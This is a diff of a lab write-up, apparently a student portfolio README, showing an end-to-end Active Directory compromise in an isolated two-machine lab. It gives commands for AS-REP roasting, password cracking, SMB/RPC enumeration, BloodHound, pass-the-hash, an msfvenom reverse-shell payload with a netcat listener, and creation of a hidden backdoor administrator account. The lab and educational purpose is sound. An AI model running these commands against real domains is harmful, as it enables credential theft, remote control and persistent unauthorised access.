@@ -1,6 +1,7 @@
 
 # Advanced Active Directory Attack Simulation: End-to-End Compromise
 
+
 ## 1. Introduction
 
 This project showcases a complete attack chain in a controlled environment, demonstrating how initial weaknesses in Active Directory configurations can lead to full domain compromise. Using Kali Linux and Windows Server 2019, I simulated real-world offensive techniques, including password cracking, enumeration, privilege escalation, and remote exploitation.
@@ -11,25 +12,13 @@ This project showcases a complete attack chain in a controlled environment, demo
  
 For this project, I prepared a controlled lab environment using two virtual machines connected through an isolated internal network named **AD-LAB**. The attacker machine was configured with **Kali Linux**, a penetration testing distribution equipped with all necessary tools. The target machine was set up with **Windows Server 2019**, configured as a **Domain Controller** for the domain **cyberlabs.local**. Manual static IP addresses were assigned to ensure proper network communication: **192.168.1.233** for the Windows Server and **192.168.1.100** for Kali Linux. The Windows Server was installed with **Active Directory Domain Services and DNS**. I created multiple users in Active Directory, including a specific target account named **BTarget**. For the attack setup, **BTarget's account was modified by disabling Kerberos pre-authentication** to make it vulnerable to AS-REP Roasting. The DNS settings on both machines were aligned correctly, and the environment was carefully validated to ensure full connectivity and readiness for attack demonstrations. This configuration allowed realistic simulation of enumeration, authentication, and exploitation scenarios within a typical corporate network structure.
 
-**Attacker Machine:** Kali Linux  
-**Target Machine:** Windows Server 2019 (Domain Controller)
-**Network:** Internal Network (AD-LAB)
+**Attacker Machine:** Kali Linux  |  **Target Machine:** Windows Server 2019 (Domain Controller)  |  **Network:** Internal Network (AD-LAB)  |  **Domain:** cyberlabs.local  |  **Target User:** BTarget
 **IP Addresses:**  
-- Windows Server 2019: 192.168.1.233  
 - Kali Linux: 192.168.1.100
-**Domain:** cyberlabs.local  
-**Target User:** BTarget
+- Windows Server 2019: 192.168.1.233  
 
 **Tools Used:**
-- Impacket Suite (GetNPUsers.py, secretsdump.py)
-- rpcclient
-- smbclient
-- BloodHound + SharpHound
-- CrackMapExec
-- John the Ripper
-- msfvenom
-- netcat (nc)
-- winPEAS.exe
+- Impacket Suite (GetNPUsers.py, secretsdump.py), rpcclient, smbclient, BloodHound + SharpHound, CrackMapExec, John the Ripper, msfvenom, netcat (nc), winPEAS.exe
 
 ---
 
@@ -48,27 +37,44 @@ The primary objective of this project was to simulate a complete attack chain ag
 
 ### 4.1 AS-REP Roasting & Password Cracking
 
-**Description:**  
-**AS-REP Roasting** is an attack technique targeting user accounts that do not require Kerberos pre-authentication. By requesting AS-REP responses from the Domain Controller, attackers can obtain encrypted **TGTs (Ticket Granting Tickets)** and attempt offline password cracking. The goal is to extract Kerberos AS-REP hashes and crack weak passwords.
+**AS-REP Roasting** is a technique used to exploit user accounts in Active Directory that have the **"Do not require Kerberos pre-authentication"** setting enabled. This misconfiguration allows an attacker to request an encrypted **TGT** (**Ticket Granting Ticket**) directly from the Domain Controller without needing to send valid credentials first.
+Once the encrypted TGT is received, it can be **cracked offline** using tools like John the Ripper. The attack is effective because it avoids detection and does not lock accounts during brute-force attempts.
 
-**Action:**  
-First, I created a `users.txt` file containing the usernames from the **Active Directory**. Then, I used the **GetNPUsers.py** script to request AS-REP hashes from the Domain Controller.
+**Step 1: Requesting AS-REP Hashes**
 
-**Commands:**
+First, I prepared a file called `users.txt` containing a list of usernames I wanted to test from Active Directory. Then, I used the `GetNPUsers.py` script from the Impacket toolkit to extract Kerberos AS-REP hashes from the Domain Controller:
 ```bash
 impacket-GetNPUsers cyberlabs.local/ -usersfile users.txt -request -dc-ip 192.168.1.233
 ```
+**Command Breakdown:**
 
-After executing the command, I successfully retrieved the **TGT ticket** of the vulnerable user. I then saved the extracted TGT hash into a file named hashes.txt for offline password cracking.
-Subsequently, I used **John the Ripper** with the popular **rockyou.txt** wordlist to attempt cracking the hash.
+`impacket-GetNPUsers:` This script is used to request AS-REP hashes for users that have Kerberos pre-authentication disabled.
+`cyberlabs.local/:` This specifies the domain name.
+`-usersfile users.txt:` This tells the script to read usernames from the file users.txt.
+`-request:` This flag tells the script to actively request TGTs for those users.
+`-dc-ip 192.168.1.233`: This is the IP address of the Domain Controller to target.
 
-**Password Cracking:**
+**Result:**
+If a user is vulnerable (doesn’t require pre-authentication), their TGT will be returned in the form of a **Kerberos AS-REP hash**, which I saved into a file named `hashes.txt` for the next step.
+
+**Step 2: Cracking the Hash**
+
+Once the hash was collected, I used **John the Ripper**, a powerful password-cracking tool, to try and brute-force the original password:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 ```
+**Command Breakdown:**
+
+`john:` Runs John the Ripper.
+`--wordlist=/usr/share/wordlists/rockyou.txt`: Specifies the rockyou.txt wordlist, one of the most widely used collections of leaked passwords.
+`hashes.txt:` This file contains the Kerberos hash retrieved earlier.
 
 **Result:**
-Successfully cracked **BTarget's password**: password1.
+John the Ripper tested many passwords from the wordlist and eventually found the correct one.
+
+**Final Result: I successfully cracked BTarget's password, it was:** **`password1`**
+
+This confirmed that the user account was vulnerable to AS-REP Roasting due to weak password practices and a misconfigured Kerberos policy. This step gave me **valid credentials** for a real domain user, which I then used in the following attack phases (like RPC and SMB enumeration).
 
 ![Password Cracked](images/password_cracked.png)
 
@@ -76,36 +82,59 @@ Successfully cracked **BTarget's password**: password1.
 
 ### 4.2 Enumeration with RPCClient
 
-**Description:**  
-`rpcclient` is a tool used to interact with Windows RPC services. It allows enumeration of users, groups, and detailed information about domain accounts, even without full administrative rights.
+After cracking BTarget's password, I performed **Active Directory enumeration** using the `rpcclient` tool. This tool allows interaction with **Windows RPC services**, enabling the enumeration of **domain users**, **groups**, and detailed **account information**, even without administrative privileges.
+This phase is crucial in a real penetration test because it reveals **who exists in the domain**, what groups are available, and what access levels users might have.
 
-**Action:**  
-Using the cracked credentials of **BTarget**, I connected to the Domain Controller via `rpcclient` to perform enumeration of users, groups, and account details.
+**Step 1: Connecting to the Domain Controller**
 
-**Command:**
+I connected to the RPC service on the Domain Controller using BTarget’s cracked credentials:
 ```bash
 rpcclient -U 'CYBERLABS.LOCAL\\BTarget' 192.168.1.233
 ```
-Once connected to the RPC interface, I executed the following enumeration commands:
+**Command Breakdown:**
+- `rpcclient`: The main enumeration tool.
+- `-U 'CYBERLABS.LOCAL\\BTarget'`: Specifies the domain and the user to authenticate with.
+- `192.168.1.233`: The IP address of the Domain Controller.
+
+Once connected, I got access to an RPC prompt where I could run enumeration commands.
+
+**Step 2: Enumerating Domain Users**
+
 ```bash
 rpcclient> enumdomusers
 ```
-Enumerated all domain users, including **administrators** and **regular users** (such as AHart, Lcyber, SConnor, BTarget, etc.).
+This command retrieved a list of **all domain user accounts**. Among them were accounts like:
+- `Administrator`, `BTarget`, `AHart`, `SConnor`, `Lcyber`, `TAlma`, `svc-SharePoint`, etc.
+
+This provided insight into **real users**, including potentially **service accounts** and **privileged identities**.
+
+**Step 3: Querying Specific User Information**
 
 ```bash
 rpcclient> queryuser 0x1f4
 ```
-Queried the **Administrator** user (RID 500) and retrieved sensitive information such as password last set time, logon count, bad password count, and other account attributes.
+The RID `0x1f4` corresponds to the built-in **Administrator account**. This command revealed:
+- Password last set time  
+- Logon count  
+- Bad password attempts  
+- Account description and more  
+This kind of info is helpful for assessing **account activity**, detecting old/unused accounts, and verifying if default accounts are active.
+
+**Step 4: Enumerating Groups**
 
 ```bash
 rpcclient> enumdomgroups
 ```
-Listed all domain groups, including highly privileged ones like **Domain Admins, Enterprise Admins, Key Admins, and Group Policy Creator Owners**.
+This command returned a list of all domain groups, including **high-privilege ones** like:
+- **Domain Admins**, **Enterprise Admins**, **Schema Admins**, **Key Admins**, **Group Policy Creator Owners**
+These groups often control critical parts of the domain — identifying them is key for building privilege escalation paths.
 
-This confirmed that **BTarget** had sufficient privileges to interact with the Domain Controller via RPC, which is a critical foothold in real-world penetration testing and internal audits.
+**Final Result:**
 
-**Result:**
-Successfully enumerated all domain users, extracted Administrator account information, and listed key privileged groups inside the Active Directory environment.
+- I confirmed that **BTarget** could interact with the Domain Controller using RPC.
+- I listed **all domain users**, including the **Administrator** account.
+- I retrieved **user attributes** and **group memberships**.
+- This enumeration step strengthened my internal mapping of the Active Directory structure and helped prepare for later attacks like BloodHound analysis and SMB share discovery.
 
 ![RPC Enumeration](images/rpc-enum.png)
 
@@ -113,92 +142,98 @@ Successfully enumerated all domain users, extracted Administrator account inform
 
 ### 4.3 SMB Share Enumeration
 
-**Description:**  
-`smbclient` is a powerful tool that allows connecting to and interacting with Windows SMB/CIFS shares. It is widely used to discover shared resources, explore accessible folders, and download valuable files during enumeration phases, even with limited user privileges.
+After obtaining valid credentials for the **BTarget** user, I performed SMB enumeration using the `smbclient` tool. This utility allows attackers and penetration testers to connect to **Windows SMB (Server Message Block)** shares to explore file systems, retrieve configurations, and look for sensitive files even as a low-privileged domain user.
 
-**Action:**  
-After obtaining valid credentials for the **BTarget** user, I connected to the SMB server hosted on the Domain Controller using `smbclient`. This allowed me to enumerate available shares and access critical folders like **SYSVOL** and **NETLOGON**.
+**Step 1: Listing Available Shares**
 
-**Commands:**
+I first listed all available shares exposed by the Domain Controller:
 ```bash
 smbclient -L //192.168.1.233 -U BTarget
 ```
-- Successfully connected to the server using BTarget:password1.
-- Discovered default Windows shares:
-  - **ADMIN$**: Administrative share (restricted)
-  - **C$**: Root of the C: drive (restricted)
-  - **IPC$**: IPC communication
-  - **NETLOGON**: Login scripts and policies (readable)
-  - **SYSVOL**: Group Policy Objects and domain configuration (readable)
+**🔍 Command Breakdown:**
+- `-L`: List available shares on the target machine.
+- `//192.168.1.233`: Target host (the Domain Controller).
+- `-U BTarget`: Authenticate as user BTarget.
 
-Both **NETLOGON** and **SYSVOL** were readable by standard domain users.
+**Result:**
+Successfully connected using `BTarget:password1`. Discovered the following default Windows shares:
 
-**Command:**
+- **ADMIN$** – Remote admin share (restricted)
+- **C$** – Root of the C: drive (admin-only)
+- **IPC$** – Inter-Process Communication
+- **NETLOGON** – Contains logon scripts and domain policies (readable)
+- **SYSVOL** – Holds domain-wide Group Policy Objects and configuration files (readable)
+
+**NETLOGON** and **SYSVOL** were **accessible with standard domain user permissions**.
+
+**Step 2: Accessing the SYSVOL Share**
+
 ```bash
 smbclient //192.168.1.233/SYSVOL -U BTarget
 smb: \> ls
 ```
-- Accessed the SYSVOL share and listed the directory **cyberlabs.local**, corresponding to the domain name.
-
-**Command:**
+The directory `cyberlabs.local` (the domain name) was present. I navigated into it:
 ```bash
 cd cyberlabs.local\\scripts
 ls
 ```
-- The **scripts** folder was empty — a normal finding, especially in freshly built domains where login scripts are not used.
+The **scripts** folder was empty, this is normal for a newly set up domain where no login scripts have been defined.
+This confirms that **BTarget** had **read access** to SYSVOL, a typical **post-exploitation pivot point** in Active Directory environments.
 
-✅ **Confirmed**: BTarget had full read access to SYSVOL, demonstrating post-exploitation access and enumeration success.
+**Step 3: Exploring Group Policy Configuration**
 
-**Command:**
 ```bash
 cd ..
 cd Policies
 ls
 ```
-- Found two major folders:
-  - `{31B2F340-016D-11D2-945F-00C04FB984F9}` ➔ Default Domain Policy
-  - `{6AC1786C-016F-11D2-945F-00C04FB984F9}` ➔ Default Domain Controllers Policy
-
-**Command:**
+Found two key Group Policy folders:
+- `{31B2F340-016D-11D2-945F-00C04FB984F9}` – Default Domain Policy
+- `{6AC1786C-016F-11D2-945F-00C04FB984F9}` – Default Domain Controllers Policy
+  
+Navigated into the first one:
 ```bash
 cd "{31B2F340-016D-11D2-945F-00C04FB984F9}"
 ls
 ```
-- Located key GPO-related files and folders:
-  - **GPT.INI** ➔ Group Policy Template version file
-  - **MACHINE** ➔ Computer-specific policies
-  - **USER** ➔ User-specific policies
+Discovered the following structure:
+- **GPT.INI** – A versioning file that tracks Group Policy changes
+- **MACHINE/** – Contains policies that apply to computers
+- **USER/** – Contains policies that apply to users
 
-**Command:**
+**Step 4: Retrieving Important Files**
+
+Downloaded and reviewed the GPT.INI file:
+
 ```bash
 get GPT.INI
 cat GPT.INI
 ```
-- Downloaded and opened the `GPT.INI` file.
-- Content:
-  ```
-  [General]
-  Version=11
-  ```
-- Shows GPO versioning — important for tracking policy changes across the domain.
+Content:
+```
+[General]
+Version=11
+```
+This indicates the version of the policy, updated whenever changes are made to GPO settings.
 
-**Command:**
+**Step 5: Getting Policy Rules**
+
+Navigated to the MACHINE directory and downloaded the **Registry.pol** file:
 ```bash
 cd MACHINE
 ls
 get Registry.pol
 ```
-- Retrieved the **Registry.pol** file, containing actual Group Policy settings (such as password policies, RDP settings, etc.).  
-- Note: Registry.pol is in binary format and cannot be directly read using `cat`.
+`Registry.pol` contains the **actual policy rules** (like password complexity, RDP settings, service permissions, etc.).  
+Note: It is in binary format and cannot be viewed directly with `cat`.
 
----
+**Final Result:**
 
-**Result:**  
-Through SMB enumeration, I successfully:
-- Discovered accessible domain shares (**SYSVOL**, **NETLOGON**)
-- Browsed internal Group Policy Objects and domain configurations
-- Retrieved critical files like **GPT.INI** and **Registry.pol**
-- Proved that a low-privileged domain user like BTarget could explore and extract important domain information, simulating a real-world post-exploitation scenario.
+Through SMB enumeration, I was able to:
+- Discover accessible shares like **SYSVOL** and **NETLOGON**
+- Navigate inside GPO structures and download key files
+- Confirm **post-exploitation read access** with a low-privileged domain user
+- Extract important domain configuration elements used to maintain security and policy enforcement in the environment
 
 ![SMB Enumeration](images/smb_enum.png)
 
@@ -206,131 +241,162 @@ Through SMB enumeration, I successfully:
 
 ### 4.4 Active Directory Mapping with BloodHound
 
-**Description:**  
-**BloodHound** is a powerful tool designed for visualizing and analyzing Active Directory environments. It identifies complex attack paths, permission misconfigurations, and relationships between domain objects, helping attackers or auditors understand potential privilege escalation routes within a domain.
+**BloodHound** is a powerful tool designed to **visualize Active Directory relationships** and uncover **attack paths** inside domain environments. It helps penetration testers, red teamers, and auditors identify privilege escalation opportunities by analyzing permissions and object relationships across users, groups, and machines.
 
-**Action:**  
-First, I prepared my attacker machine (Kali Linux) by installing BloodHound and Neo4j:
+**Step 1: Preparing the Environment on Kali Linux**
 
-**Commands:**
+I began by installing the required tools:
 ```bash
 sudo apt update
 sudo apt install bloodhound neo4j -y
 ```
-I started the Neo4j database:
+Then, I started the **Neo4j** graph database:
 ```bash
 sudo neo4j console
 ```
-Then accessed it through my browser at `http://localhost:7474/browser/` and logged in with:
-- **Username:** neo4j
-- **Password:** Password123 (newly set)
+Accessed the database in my browser at:
+```
+http://localhost:7474/browser/
+```
+Logged in with:
+- **Username**: `neo4j`
+- **Password**: `Password123` (set during first login)
 
-After database setup, I launched BloodHound:
+Then I launched the BloodHound GUI:
 ```bash
 bloodhound
 ```
 Logged in using the same Neo4j credentials.
 
----
+**Step 2: Preparing SharpHound for Data Collection**
 
-Next, I prepared to collect Active Directory data:
-1. Fixed DNS resolution to enable downloading SharpHound.exe:
+To collect Active Directory data, I used **SharpHound.exe**, BloodHound’s data collection tool for Windows.
+First, I had to **fix DNS resolution** in Kali to allow downloading from GitHub:
 ```bash
 sudo nano /etc/resolv.conf
 ```
-Added Google's DNS servers (8.8.8.8 and 8.8.4.4).  
-Tested connectivity:
+I added the following DNS servers:
+```
+nameserver 8.8.8.8
+nameserver 8.8.4.4
+```
+Then confirmed GitHub was reachable:
 ```bash
 ping raw.githubusercontent.com
 ```
 Downloaded SharpHound.exe:
+
 ```bash
 wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -O SharpHound.exe
 ```
+**Step 3: Uploading SharpHound to the Target**
 
-2. Uploaded SharpHound.exe to the Windows Server:
+Uploaded `SharpHound.exe` to the target using `smbclient`:
 ```bash
 smbclient //192.168.1.233/ShareTest -U BTarget
 put SharpHound.exe
 ```
-Confirmed successful upload into the ShareTest directory.
+Confirmed it appeared in the `ShareTest` folder on the Windows Server.
 
-3. On Windows Server 2019:
-- Copied SharpHound.exe from ShareTest to the Desktop.
-- Opened **Command Prompt** as Administrator.
-- Navigated to Desktop:
+**Step 4: Executing SharpHound on the Windows Server**
+
+On the Windows machine:
+
+1. Moved `SharpHound.exe` from `ShareTest` to the **Desktop**.
+2. Opened **Command Prompt as Administrator**.
+3. Navigated to the Desktop:
 ```bash
 cd Desktop
 ```
-- Executed SharpHound data collection:
+4. Ran the collection:
 ```bash
 SharpHound.exe -c All
 ```
-✅ This collected comprehensive AD data and generated a `.zip` file (e.g., `20250426134424_BloodHound.zip`) on the Desktop.
+This generated a ZIP file with the AD data, e.g.:
+```
+20250426134424_BloodHound.zip
+```
 
----
+**Step 5: Retrieving the .zip File Back to Kali**
 
-4. Retrieved the .zip file from Windows to Kali:
+Downloaded the BloodHound data archive back to Kali via SMB:
 ```bash
 smbclient //192.168.1.233/ShareTest -U BTarget
 get "20250426134424_BloodHound.zip"
 ```
-Saved the file locally for upload.
+Now I had the AD data locally on Kali for import.
 
-5. Uploaded the .zip data into BloodHound:
-- Opened BloodHound GUI.
-- Clicked the Upload Data button (📤 icon).
-- Selected the retrieved BloodHound .zip file for analysis.
+**Step 6: Uploading Data to BloodHound for Analysis**
 
----
+In BloodHound:
+- Clicked the **📤 Upload Data** button.
+- Selected the retrieved ZIP file.
+BloodHound automatically parsed and mapped the entire Active Directory structure.
 
-**Result:**  
-After importing the data, I visualized the Active Directory structure:
-- Located **BTarget** user node.
-- Used the BloodHound interface to find **Shortest Paths to High-Value Targets** (e.g., Domain Admins).
-- Discovered possible escalation opportunities through permissions like **GenericAll**, **GenericWrite**, **AddKeyCredentialLink**, **GetChanges**, **GetChangesAll**, and even **DCSync** privileges.
-
-This mapping clearly outlined possible attack paths from BTarget towards compromising privileged domain accounts, simulating real-world Active Directory attacks and lateral movement strategies.
+**Final Result:**
+I navigated to the **BTarget@cyberlabs.local** user node and used BloodHound to:
+- **Visualize relationships** between users, groups, and permissions.
+- Use the "Shortest Path to High-Value Targets" feature to detect escalation paths.
+- Identify powerful permissions like:
+  - `GenericAll`
+  - `GenericWrite`
+  - `AddKeyCredentialLink`
+  - `GetChanges` / `GetChangesAll`
+  - `DCSync` (Domain Replication)
+This allowed me to simulate **lateral movement and privilege escalation** scenarios from BTarget to Domain Admin — just like in a real-world AD compromise.
 
 ![BloodHound Graph](images/bloodhound_graph.png)
 
+---
+
 ### 4.5 Pass-the-Hash (PTH) Authentication
 
-**Description:**  
-**Pass-the-Hash (PTH)** is a post-exploitation technique where an attacker authenticates to services using an NTLM hash instead of the user's plaintext password. It allows lateral movement across systems without needing to crack passwords, drastically increasing attack capabilities after initial credential compromise.
+**Pass-the-Hash (PTH)** is a powerful **post-exploitation technique** that allows an attacker to authenticate to services using a **user’s NTLM hash** without needing their actual plaintext password. Once a hash is obtained (through cracking or extraction), it can be reused to access systems and services that accept NTLM authentication.
+This allows lateral movement across the network without triggering password lockouts or alerts.
 
-**Action:**  
-After cracking BTarget’s password, I generated its corresponding NTLM hash manually to perform a Pass-the-Hash attack using **CrackMapExec**.
+**Step 1: Generate the NTLM Hash of the Cracked Password**
 
-**Commands:**
+After cracking **BTarget’s password** (`password1`), I generated its NTLM hash manually:
 ```bash
-# Generate NTLM hash of "password1"
 echo -n 'password1' | iconv -t UTF-16LE | openssl dgst -md4
 ```
-- Output example:
-  ```
-  (stdin)= 5835048ce94ad0564e29a924a03510ef
-  ```
-This is the NTLM hash for the cracked password `password1`.
+Output example:
+```
+(stdin)= 5835048ce94ad0564e29a924a03510ef
+```
+This is the **NTLM hash** for the plaintext password `password1`.
 
-**Performed the Pass-the-Hash attack:**
+**Step 2: Authenticate Using CrackMapExec and the Hash**
+
+I then used **CrackMapExec**, a post-exploitation tool, to authenticate to SMB services on the Domain Controller using only the hash:
 ```bash
 crackmapexec smb 192.168.1.233 -u BTarget -H 5835048ce94ad0564e29a924a03510ef --shares
 ```
-✅ Successfully authenticated to the SMB service **without needing the password**, relying solely on the NTLM hash.
+**🔍 Command Breakdown:**
+- `crackmapexec smb`: Specifies the protocol and tool.
+- `192.168.1.233`: Target machine (Domain Controller).
+- `-u BTarget`: Username to authenticate as.
+- `-H <NTLM hash>`: The hash being passed instead of a password.
+- `--shares`: Option to list accessible SMB shares.
 
-✅ Enumerated accessible shares, confirming read/write access to **ShareTest** and read access to **NETLOGON** and **SYSVOL**.
+**Authentication succeeded using only the NTLM hash.**  
+I didn’t enter any password, proving that **Pass-the-Hash was successful**.
 
----
+**Step 3: Enumerating SMB Shares**
 
-**Result:**  
-Successfully demonstrated a Pass-the-Hash attack:
-- Authenticated as BTarget without knowing the cleartext password.
-- Enumerated domain shares over SMB.
-- Gained lateral movement capabilities within the internal network.
+As a result of the successful authentication, I was able to:
+- Access **NETLOGON** (read)
+- Access **SYSVOL** (read)
+- Access **ShareTest** (read/write)
+These shares contain sensitive configuration files and serve as pivot points for further attacks or enumeration.
 
-🛡️ **Real-World Note:**  
-In real-world attacks, using PTH means an attacker can compromise and pivot within a domain **without ever cracking passwords** — simply by abusing available hashes.
+**Final Result:**
+- Performed a successful **Pass-the-Hash** attack using BTarget’s NTLM hash.
+- Gained access to important **SMB shares** without knowing or reusing the password.
+- Achieved **stealthy lateral movement capability** a common real-world adversary tactic.
+
+**Real-World Implication:**  
+PTH attacks allow adversaries to **spread across systems silently**, reusing hash values and bypassing traditional password protections. It is especially dangerous when combined with other privilege escalation methods or service misconfigurations.
 
 ![PTH Success](images/pth_success.png)
 
@@ -338,125 +404,136 @@ In real-world attacks, using PTH means an attacker can compromise and pivot with
 
 ### 4.6 Post-Exploitation Enumeration with winPEAS
 
-**Description:**  
-**winPEAS** is a post-exploitation enumeration tool that identifies potential privilege escalation vectors, vulnerable configurations, exposed credentials, and misconfigured permissions on Windows systems.
+Once I gained access to the target Windows Server through SMB and confirmed post-exploitation access, I performed **local privilege escalation enumeration** using **winPEAS**, a powerful reconnaissance tool used by attackers to uncover misconfigurations, stored credentials, and exploitable paths.
 
-**Action:**  
-After confirming SMB access via PTH, I used **winPEAS** for detailed enumeration.
+**Step 1: Downloading winPEAS to Kali Linux**
 
-**Steps:**
-1. Downloaded winPEAS.exe:
+I downloaded the latest version of winPEAS from GitHub:
 ```bash
 wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O winPEAS.exe
 ```
+This saved the executable as `winPEAS.exe` on my attacker machine.
 
-2. Uploaded winPEAS.exe to the target machine:
+**Step 2: Uploading winPEAS to the Target**
+
+I used `smbclient` to upload the file to a writable SMB share (`ShareTest`) on the Domain Controller:
 ```bash
 smbclient //192.168.1.233/ShareTest -U BTarget
 put winPEAS.exe
 ```
+Upload confirmed winPEAS.exe was now available on the target machine.
 
-3. Executed winPEAS.exe manually on the Windows Server:
-- Navigated to the **ShareTest** folder.
-- Double-clicked **winPEAS.exe** to run it.
+**Step 3: Executing winPEAS on the Windows Server**
 
-✅ winPEAS automatically scanned the system for:
-- DLL hijacking opportunities
-- Misconfigured services
-- Weak file/folder permissions
-- Stored passwords and credentials
-- System and service details
+On the Windows Server:
+1. Navigated to the `ShareTest` directory
+2. **Double-clicked** `winPEAS.exe` to run it manually
+No administrator privileges were required for this basic scan.
 
----
+**Result of winPEAS Enumeration:**
 
-**Result:**  
-Identified potential vulnerabilities and misconfigurations useful for privilege escalation and persistence.  
-The information gathered provided valuable insights for potential future exploitation within the domain.
+winPEAS ran a **comprehensive scan** of the local system, automatically identifying:
+- **DLL Hijacking** vectors
+- **Misconfigured services**
+- **Weak permissions** on sensitive files and folders
+- **Stored credentials** in memory or config files
+- **System info**, environment variables, services, and scheduled tasks
 
-✅ Demonstrated full post-exploitation enumeration after initial access.
+**Final Result:**
+- Confirmed that **BTarget’s access allowed post-exploitation enumeration**.
+- Identified **several potential privilege escalation vectors**.
+- This phase would support follow-up attacks like service exploitation, user impersonation, or registry abuse in a real-world scenario.
+This step proves that I had complete post-exploitation visibility inside the domain critical for understanding privilege abuse opportunities and establishing persistence.
 
 ![winPEAS Results](images/winpeas_results.png)
 
+---
+
 ### 4.7 Reverse Shell Attack
 
-**Description:**  
-A **reverse shell** is a post-exploitation technique where the compromised machine initiates a connection back to the attacker's machine, granting the attacker full interactive shell access remotely. It is a crucial step for gaining persistent and interactive control over a target system after initial compromise.
+Once I completed enumeration and discovered potential privilege escalation opportunities, I moved to establish **full remote control** over the Windows Server using a **reverse shell**.
+A **reverse shell** allows the target machine to connect back to the attacker, creating an interactive session. This enables stealthy and persistent post-exploitation activities.
 
-**Action:**  
-After performing enumeration and privilege escalation discovery, I generated and deployed a reverse shell to achieve full control over the target machine.
+**Step 1: Generating the Reverse Shell Payload**
 
-**Steps:**
-
-1. **Generated a reverse shell payload** using `msfvenom`:
+I used `msfvenom` to generate a Windows reverse shell executable:
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o reverse_shell.exe
 ```
-- Created a Windows executable (`reverse_shell.exe`) that, once executed, connects back to my Kali Linux machine on port 4444.
+**Command Breakdown:**
+- `-p windows/shell_reverse_tcp`: Specifies the payload type (reverse shell for Windows).
+- `LHOST=192.168.1.100`: Attacker’s IP address (Kali Linux machine).
+- `LPORT=4444`: Listening port on the attacker's machine.
+- `-f exe`: Output format as a Windows executable file.
+- `-o reverse_shell.exe`: Output file name.
+The payload `reverse_shell.exe` was successfully created.
 
-2. **Uploaded the reverse shell payload** to the target Windows Server:
+**Step 2: Uploading the Payload to the Target**
+
+I uploaded the payload to a writable share on the Windows Server:
 ```bash
 smbclient //192.168.1.233/ShareTest -U BTarget
 put reverse_shell.exe
 ```
-- Uploaded the payload to the writable share **ShareTest**.
+The file was placed into the `ShareTest` directory for execution.
 
-3. **Started a Netcat listener** on Kali to wait for the incoming reverse connection:
+**Step 3: Setting Up a Listener on Kali**
+
+To capture the incoming reverse connection, I set up a **Netcat** listener:
 ```bash
 nc -lvnp 4444
 ```
+This made Kali ready to accept incoming shells on port 4444.
 
-4. **Executed the payload manually** on Windows Server:
-- Navigated to the **ShareTest** folder.
-- Double-clicked `reverse_shell.exe` to execute it.
+**Step 4: Executing the Payload on Windows Server**
 
-✅ As a result, the Windows Server initiated a connection back to Kali, establishing a full shell session!
+On the target machine:
+- Navigated to the `ShareTest` folder.
+- **Double-clicked** on `reverse_shell.exe`.
+This triggered a reverse connection back to Kali, and a full shell was established!
 
----
+**Post-Access Validation Commands**
 
-**Result:**  
-- Obtained a full **reverse shell** as **Administrator**.
-- Executed important system validation commands to confirm full control:
+Once connected, I executed various system commands to validate full access:
 ```bash
-whoami        # Displays the current username under which the shell is running.
-hostname      # Shows the name of the machine (the computer's network name).
-net users     # Lists all local user accounts on the system.
-systeminfo    # Provides detailed system information (OS version, architecture, hotfixes, etc.).
-tasklist      # Lists all currently running processes on the system.
+whoami        # Displays the current username (Administrator).
+hostname      # Shows the computer's name.
+net users     # Lists all local user accounts.
+systeminfo    # Provides detailed information about the operating system.
+tasklist      # Lists all running processes on the system.
 ```
-
-
-✅ Verified administrative privileges and extracted useful system information.
+Confirmed full administrative privileges.
 
 ![Reverse Shell Access](images/reverse_shell.png)
 
----
+### 4.8 Creating a Text File (Proof of System Compromise)
 
-**Bonus:**  
-To demonstrate full system compromise:
-- Created a new text file named `PWNED.txt` on the Administrator's Desktop containing a custom message.
+To demonstrate **full read/write/execute control** over the compromised system:
+- I created a new text file named `PWNED.txt` on the Administrator's Desktop containing a custom message.
+This action proved total dominance over the system and the ability to manipulate files at will.
 
-This action proved complete read/write/execute control over the compromised server.
+### 4.9 Creating a Hidden Administrator Account
 
-
-### 4.8 Bonus: Creating a Hidden Administrator Account
-
-**Description:**  
-After obtaining Administrator access through a successful reverse shell, I created a hidden backdoor account to maintain persistent privileged access to the Windows Server.
-
-**Action:**  
-Using the remote shell, I executed the following commands:
-
+After gaining complete system control, I created a **persistent hidden admin account** to maintain future accessa common adversary technique.
 ```bash
 net user GhostUser P@ssw0rd123 /add
 net localgroup Administrators GhostUser /add
 ```
-- `net user GhostUser P@ssw0rd123 /add`: Created a new user account named **GhostUser** with the specified password.
-- `net localgroup Administrators GhostUser /add`: Added the **GhostUser** account into the **Administrators** group.
+**Command Breakdown:**
+- `net user GhostUser P@ssw0rd123 /add`: Created a new user named **GhostUser** with password `P@ssw0rd123`.
+- `net localgroup Administrators GhostUser /add`: Added **GhostUser** to the **Administrators** group, granting full privileges.
+Successfully established a **backdoor administrative user** for persistent access.
 
-✅ These actions allowed me to establish a **permanent privileged account** on the target machine without relying on the initially compromised user (**BTarget**).
+![GhostUser Created](images/ghostuser_created.png)
 
-**Result:**  
-Successfully created a new **Administrator account** on the Windows Server, allowing independent and persistent access for future actions.
+---
+
+**✅ Final Result:**
+
+- Achieved a full **reverse shell** session with Administrator rights.
+- Validated control over the system via enumeration commands.
+- Created a **new hidden Administrator account** ensuring long-term persistence.
+- Demonstrated complete post-exploitation capabilities typical of real-world threat actors.
 
 ![GhostUser Created](images/ghostuser_created.png)
 
@@ -471,11 +548,10 @@ Successfully created a new **Administrator account** on the Windows Server, allo
 - [PEASS-ng GitHub - Privilege Escalation Awesome Scripts (winPEAS)](https://github.com/carlospolop/PEASS-ng)
 - [Kali Linux Official Tools Documentation](https://tools.kali.org/tools-listing)
 
-
 ---
 
 ## 6. Conclusion
 
 The project successfully simulated an end-to-end domain attack starting from basic enumeration to full Administrator compromise. Key vulnerabilities exploited included weak Kerberos authentication policies, insecure SMB shares, and lack of proper privilege hardening.
-
 This exercise not only reinforced theoretical concepts but also provided hands-on experience with real-world adversary techniques, preparing me for more advanced penetration testing and security analysis tasks.
+*This project was designed using a streamlined two-machine setup—Kali Linux as the attacker and Windows Server 2019 as the Domain Controller—to simulate a real-world domain compromise. While some scenarios involve multiple hosts, directly targeting the Domain Controller allowed me to demonstrate full end-to-end exploitation, privilege escalation, and persistence across the domain with precision and clarity.*
